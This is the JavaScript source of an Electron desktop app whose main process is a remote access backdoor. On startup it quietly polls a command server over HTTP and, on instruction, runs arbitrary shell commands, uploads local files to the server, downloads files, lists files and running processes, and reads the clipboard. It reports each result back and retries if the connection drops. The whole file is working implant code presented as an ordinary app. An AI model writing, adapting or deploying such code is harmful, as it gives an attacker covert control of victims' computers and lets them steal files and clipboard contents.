const { app, BrowserWindow, clipboard } = require('electron');
const http = require('http');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const os = require('os');
const { v4: uuidv4 } = require('uuid');

let mainWindow;

function createWindow() {
    mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        }
    });

    mainWindow.loadFile('index.html');
}

class HTTPClient {
    constructor(host, port) {
        this.baseURL = `http://${host}:${port}/client`;
        this.uuid = uuidv4();
    }

    async sendMessage(message) {
        return new Promise((resolve, reject) => {
            const data = JSON.stringify(message);
            const options = {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Content-Length': Buffer.byteLength(data),
                    'UUID': this.uuid
                }
            };

            const req = http.request(this.baseURL, options, (res) => {
                let responseData = '';
                res.on('data', (chunk) => {
                    responseData += chunk;
                });
                res.on('end', () => {
                    try {
                        const result = JSON.parse(responseData);
                        resolve(result);
                    } catch (error) {
                        reject(error);
                    }
                });
            });

            req.on('error', (error) => {
                reject(error);
            });

            req.write(data);
            req.end();
        });
    }

    async uploadFile(filePath) {
        return new Promise((resolve, reject) => {
            if (!fs.existsSync(filePath)) {
                reject(`Error: The file '${filePath}' does not exist.`);
                return;
            }

            const fileName = path.basename(filePath);
            const fileData = fs.readFileSync(filePath);

            const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(2);
            const options = {
                method: 'POST',
                headers: {
                    'Content-Type': `multipart/form-data; boundary=${boundary}`,
                    'UUID': this.uuid
                }
            };

            const req = http.request(`${this.baseURL}/upload`, options, (res) => {
                if (res.statusCode === 200) {
                    resolve('File uploaded successfully.');
                } else {
                    let errorData = '';
                    res.on('data', (chunk) => {
                        errorData += chunk;
                    });
                    res.on('end', () => {
                        reject(`Failed to upload file. Status: ${res.statusCode}, Response: ${errorData}`);
                    });
                }
            });

            req.on('error', (error) => {
                reject(`Error uploading file: ${error.message}`);
            });

            let postData = `--${boundary}\r\n`;
            postData += `Content-Disposition: form-data; name="file"; filename="${fileName}"\r\n`;
            postData += 'Content-Type: application/octet-stream\r\n\r\n';
            postData += fileData;
            postData += `\r\n--${boundary}--\r\n`;

            req.write(postData);
            req.end();
        });
    }

    async downloadFile(fileName) {
        return new Promise((resolve, reject) => {
            const options = {
                method: 'GET',
                headers: {
                    'UUID': this.uuid
                }
            };

            const req = http.request(`${this.baseURL}/download?filename=${encodeURIComponent(fileName)}`, options, (res) => {
                if (res.statusCode === 200) {
                    const fileStream = fs.createWriteStream(fileName);
                    res.pipe(fileStream);
                    fileStream.on('finish', () => {
                        fileStream.close();
                        resolve(`File downloaded successfully: ${fileName}`);
                    });
                    fileStream.on('error', (error) => {
                        reject(`Error downloading file: ${error.message}`);
                    });
                } else {
                    let errorData = '';
                    res.on('data', (chunk) => {
                        errorData += chunk;
                    });
                    res.on('end', () => {
                        reject(`Failed to download file. Status: ${res.statusCode}, Response: ${errorData}`);
                    });
                }
            });

            req.on('error', (error) => {
                reject(`Error downloading file: ${error.message}`);
            });

            req.end();
        });
    }

    async executeCommand(command, options = {}) {
        const {
            timeout = 30000, // 默认30秒超时
            cwd = process.cwd(), // 默认当前工作目录
            env = process.env, // 默认使用当前环境变量
            shell = true // 默认使用shell执行
        } = options;

        return new Promise((resolve, reject) => {
            const childProcess = exec(command, {
                cwd,
                env,
                shell,
                timeout
            }, (error, stdout, stderr) => {
                if (error) {
                    if (error.killed) {
                        resolve(`命令执行超时 (${timeout}ms)`);
                    } else {
                        resolve(`命令执行错误: ${error.message}\n退出码: ${error.code}`);
                    }
                } else {
                    const output = stdout || stderr;
                    resolve(output.trim());
                }
            });

            // 监听进程退出
            childProcess.on('exit', (code, signal) => {
                if (code !== 0 && !signal) {
                    resolve(`命令执行完成，退出码: ${code}`);
                }
            });

            // 监听错误
            childProcess.on('error', (error) => {
                resolve(`进程错误: ${error.message}`);
            });
        });
    }

    async listFiles() {
        try {
            const files = fs.readdirSync('.');
            return files.join('\n');
        } catch (error) {
            return `Error listing files: ${error.message}`;
        }
    }

    async getClipboard() {
        try {
            return clipboard.readText();
        } catch (error) {
            return `Error getting clipboard content: ${error.message}`;
        }
    }

    async listProcesses() {
        return new Promise((resolve, reject) => {
            const command = process.platform === 'win32' ? 'tasklist' : 'ps aux';
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    resolve(`Error listing processes: ${error.message}`);
                } else {
                    resolve(stdout || stderr);
                }
            });
        });
    }

    async startMessageLoop() {
        try {
            // 发送初始消息获取UUID
            const initResponse = await this.sendMessage({ command: 'init' });
            console.log(`Got UUID: ${this.uuid}`);

            // 开始消息循环
            while (true) {
                try {
                    // 发送GET请求等待服务器指令
                    const response = await new Promise((resolve, reject) => {
                        const options = {
                            method: 'GET',
                            headers: {
                                'UUID': this.uuid
                            }
                        };

                        const req = http.request(this.baseURL, options, (res) => {
                            let responseData = '';
                            res.on('data', (chunk) => {
                                responseData += chunk;
                            });
                            res.on('end', () => {
                                try {
                                    const result = JSON.parse(responseData);
                                    resolve(result);
                                } catch (error) {
                                    reject(error);
                                }
                            });
                        });

                        req.on('error', (error) => {
                            reject(error);
                        });

                        req.end();
                    });

                    console.log('Server Response:', response);

                    if (response.command) {
                        let result;
                        const commandType = response.command.split(' ')[0];
                        const commandArgs = response.command.split(' ').slice(1).join(' ');

                        switch (commandType) {
                            case 'execute_command':
                                result = await this.executeCommand(commandArgs);
                                break;
                            case 'download_file':
                                result = await this.downloadFile(commandArgs);
                                break;
                            case 'upload_file':
                                result = await this.uploadFile(commandArgs);
                                break;
                            case 'list_files':
                                result = await this.listFiles();
                                break;
                            case 'list_processes':
                                result = await this.listProcesses();
                                break;
                            case 'get_clipboard':
                                result = await this.getClipboard();
                                break;
                            default:
                                result = 'Unknown command';
                        }

                        console.log('Command Result:', result);
                        // 发送执行结果
                        await this.sendMessage({ 
                            command: response.command,
                            result: result 
                        });

                        // 继续等待下一个命令
                        continue;
                    }
                } catch (error) {
                    if (error.code === 'ECONNREFUSED') {
                        console.log('Connection error, retrying in 300 seconds:', error.message);
                        await new Promise(resolve => setTimeout(resolve, 300000)); // 等待300秒
                    } else {
                        console.log('Request error:', error.message);
                    }
                }
                await new Promise(resolve => setTimeout(resolve, 5000)); // 等待5秒
            }
        } catch (error) {
            console.error('Error starting message loop:', error.message);
            throw error;
        }
    }
}

const defaultClient = new HTTPClient('127.0.0.1', '8080');

app.whenReady().then(() => {
    createWindow();
    global.HTTPClient = HTTPClient;
    global.defaultClient = defaultClient;
    defaultClient.startMessageLoop();
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        createWindow();
    }
});


